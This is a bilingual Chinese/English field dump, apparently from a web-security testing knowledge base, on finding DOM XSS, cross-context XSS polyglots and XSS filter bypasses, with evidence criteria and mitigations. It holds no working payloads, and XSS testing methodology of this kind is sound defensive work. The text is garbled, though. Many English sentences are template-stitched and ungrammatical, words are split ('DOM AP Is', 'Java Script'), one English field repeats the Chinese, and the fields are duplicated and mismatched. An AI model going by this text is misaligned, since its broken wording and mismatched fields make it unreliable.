vulnerability.zh: 客户端边界失效的前提为：源值未经过协议允许列表、Trusted Types 或上下文编码就进入 DOM sink，并且浏览器允许对应 URL 方案或文档类型。审计应围绕“客户端脚本是否把可控 URL 片段从 location 系列来源传到 href、src、innerHTML 或动态导航等执行 sink”记录源值、解码次数、赋值 API 与执行上下文。只有取得“DevTools 数据流、最终 sink 值与唯一执行标记可对应到同一次客户端操作，而服务器响应中可以没有该字符串”，才能证明可控数据到达了可执行 sink。
vulnerability.en: The risk exists when a source value reaches a DOM sink without a protocol allowlist, Trusted Types, or context encoding, and the browser permits the resulting URL scheme or document type, allowing whether client code moves a controllable URL fragment from location-derived sources into executable sinks such as href, src, inner HTML, or dynamic navigation. Review the input source, final parsing context, browser or policy version, and Dev Tools data flow, the final sink value, and a unique execution marker correlate to one client action even when the server response never contains the string; otherwise record only an unconfirmed control differential.

exploitation.zh: 对 hash、query 与完整 URL 分别设置同一标记，单步跟踪读取、解码和写入位置，确认危险方案是在赋值前还是赋值后形成。在 DevTools 中分别对真实读取点和写入点设置断点，使用一次性标记跟踪源值、规范化结果与最终 DOM；每轮只改变一个来源或 sink，避免把导航限制或 CSP 阻断误认为数据流已经修复。
exploitation.en: 对 hash、query 与完整 URL 分别设置同一标记，单步跟踪读取、解码和写入位置，确认危险方案是在赋值前还是赋值后形成。在 Dev Tools 中分别对真实读取点和写入点设置断点，使用一次性标记跟踪源值、规范化结果与最终 DOM；每轮只改变一个来源或 sink，避免把导航限制或 CSP 阻断误认为数据流已经修复。

mitigation.zh: 用 textContent 和固定 DOM API 替代 HTML 字符串写入，对导航目标执行 https/http 同源或业务允许列表，并启用 Trusted Types 限制危险 sink。回归应覆盖原客户端来源、合法业务 URL 或文本以及最小危险值，确认安全 API 保留原功能，且危险 sink 不再收到攻击者可控字符串。
mitigation.en: Remediation should replace HTML string writes with text Content and fixed DOM AP Is, allowlist same-origin or approved https/http navigation targets, and enforce Trusted Types for dangerous sinks. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: 跨上下文 XSS Polyglot

description.zh: 用同时包含标签闭合、属性事件、URL 方案与 SVG 片段的组合输入，识别应用未知或多阶段输出上下文中的解析突破。
description.en: Uses combined tag closures, event attributes, URL schemes, and SVG fragments to identify parser breakouts when the output context is unknown or changes across stages.

prerequisites.zh: 目标输出位置可能跨越标签、属性、URL 或脚本等多个解析上下文，并能记录每次模板和客户端重写。
prerequisites.en: The output may cross tag, attribute, URL, or script parsing contexts, and every template or client-side rewrite can be recorded.

prerequisites.zh: 每次只在一个已知上下文使用缩减后的 polyglot 与固定 marker，对照保存响应字节、DOM tokenizer 结果和调用栈。
prerequisites.en: Each run uses a minimized polyglot and fixed marker in one known context, preserving response bytes, DOM tokenizer results, and call stack for comparison.

description.zh: XSS Polyglot (多上下文通用)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Cross-Context XSS Polyglot validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是 polyglot 在目标实际解析状态中突破边界、创建可执行属性或节点并触发 marker；报告必须指出生效的最小片段和 tokenizer 状态。 假阳性边界：WAF 放行、输入完整回显、DOM 发生无害修复、在另一上下文手工粘贴可执行或仅某浏览器报语法错误均是假阳性。
analysis.en: Positive evidence requires the polyglot to escape the actual target parser state, create an executable attribute or node, and trigger the marker, with the minimal effective fragment and tokenizer state identified. False-positive boundary: WAF allowance, intact reflection, harmless DOM repair, execution only after manual placement in another context, or a browser syntax error are false positives.

opsecTips.zh: 跨上下文 polyglot 每轮只保留一个触发面；出现页面结构大面积破坏、导航、无限事件、下载或网络请求时停止。
opsecTips.en: Cross-context polyglot testing retains one trigger surface per run; stop on broad layout damage, navigation, event loops, downloads, or network requests.

opsecTips.zh: 删除 polyglot 输入和渲染记录，清理模板、DOM 与 CDN 缓存，重建测试页面并确认正常内容的解析树恢复。
opsecTips.en: Delete polyglot inputs and rendered records, clear template, DOM, and CDN caches, rebuild the test page, and confirm the parse tree for normal content is restored.

description.en: Trace the real input to the final sink or policy decision, confirm that the application reuses one field across views or performs multiple encode/decode stages, so one HTML-text encoding rule does not match the final context, and record browser, response-header, and relevant component versions.

title.zh: 建立“多解析上下文”解析基线

description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the exact breakout sequence, final DOM node, and execution event are recorded rather than attributing any response change to a successful polyglot as valid evidence.

title.zh: 修复并回归“跨上下文 XSS Polyglot”
title.en: Retest the Cross-Context XSS Polyglot remediation boundary

description.zh: 在数据写入每个最终 sink 时重新执行上下文编码，减少跨视图原样复用，并用模板自动转义、HTML 消毒与 Trusted Types 形成分层控制；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the exact breakout sequence, final DOM node, and execution event are recorded rather than attributing any response change to a successful polyglot no longer appears.

overview.zh: 跨上下文 XSS Polyglot用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：同一输入经过模板、HTML tokenizer 和 JavaScript 或 URL 子解析器后，是否在至少一个上下文形成可执行结构。测试成立的前提为：应用在不同视图复用同一字段或经过多次编码解码，导致开发者无法用单一 HTML 文本编码覆盖最终上下文。证据要求为：记录实际命中的闭合序列、最终 DOM 节点与执行事件，不能把任意响应变化归因于 Polyglot 成功。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: Cross-Context XSS Polyglot checks whether one input becomes executable in at least one context after passing through templating, the HTML tokenizer, and Java Script or URL subparsers. It applies when the application reuses one field across views or performs multiple encode/decode stages, so one HTML-text encoding rule does not match the final context. A conclusion requires the exact breakout sequence, final DOM node, and execution event are recorded rather than attributing any response change to a successful polyglot; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：应用在不同视图复用同一字段或经过多次编码解码，导致开发者无法用单一 HTML 文本编码覆盖最终上下文。审查时必须确认“同一输入经过模板、HTML tokenizer 和 JavaScript 或 URL 子解析器后，是否在至少一个上下文形成可执行结构”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“记录实际命中的闭合序列、最终 DOM 节点与执行事件，不能把任意响应变化归因于 Polyglot 成功”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when the application reuses one field across views or performs multiple encode/decode stages, so one HTML-text encoding rule does not match the final context, allowing whether one input becomes executable in at least one context after passing through templating, the HTML tokenizer, and Java Script or URL subparsers. Review the input source, final parsing context, browser or policy version, and the exact breakout sequence, final DOM node, and execution event are recorded rather than attributing any response change to a successful polyglot; otherwise record only an unconfirmed control differential.

exploitation.zh: 先用单字符探针判断引号、标签和脚本边界，再提交原 Polyglot 集合；每次只保留最小可复现片段以定位真正有效的解析分支。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, probe quote, tag, and script boundaries with single characters before submitting the original polyglot set, then minimize any success to the actual parser branch. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 在数据写入每个最终 sink 时重新执行上下文编码，减少跨视图原样复用，并用模板自动转义、HTML 消毒与 Trusted Types 形成分层控制。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should apply context encoding at every final sink, reduce raw reuse across views, and layer template auto-escaping, HTML sanitization, and Trusted Types. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: XSS 过滤与规范化绕过

description.zh: 比较大小写、畸形标签、字符引用和动态属性访问在过滤器与浏览器中的处理差异，定位黑名单式 XSS 防护缺口。
description.en: Compares case changes, malformed markup, character references, and dynamic property access between filters and browsers to locate blacklist-based XSS gaps.

prerequisites.zh: 请求经过目标过滤器、应用解码和浏览器解析的同一真实路径，并可取得每层的原始与规范化值。
prerequisites.en: The request follows the same real path through the target filter, application decoding, and browser parsing, with raw and canonical values available at every layer.

prerequisites.zh: 存在会被正确阻断的危险基线和应被允许的普通 HTML 基线，绕过样例只调用本地一次性 marker。
prerequisites.en: A dangerous baseline is correctly blocked, a benign HTML baseline is allowed, and bypass samples call only a local one-time marker.

title.zh: 标准测试

description.zh: 标准payload
description.en: Standard payloads

analysis.zh: 阳性证据是过滤层接受某变体，源站输出后浏览器规范化为可执行节点并触发 marker；边缘、源站和 DOM 证据须共享请求 ID。 假阳性边界：过滤器放行或返回 200、规则告警消失、输入被编码回显、浏览器产生惰性节点或直接绕过过滤层访问源站都不是有效绕过。
analysis.en: Positive evidence requires a variant to pass the filter, become an executable node after origin output and browser normalization, and trigger the marker, with edge, origin, and DOM evidence sharing one request identifier. False-positive boundary: Filter allowance or HTTP 200, disappearance of a rule alert, encoded reflection, an inert browser node, or direct-origin access that bypasses the filter is not a valid bypass.

opsecTips.zh: XSS 过滤差异测试限制为少量单变量样例；发现生产规则变化、缓存污染、用户流量命中或非 marker 执行时立即停止。
opsecTips.en: XSS filter differential testing uses a small single-variable set; stop on production rule changes, cache contamination, user-traffic impact, or execution beyond the marker.

opsecTips.zh: 撤销临时规则与源站调试，清理边缘和应用缓存、测试请求日志及 DOM 样例，并重放正常/阻断基线。
opsecTips.en: Revert temporary rules and origin debugging, clear edge and application caches, test-request logs, and DOM samples, then replay benign and blocked baselines.
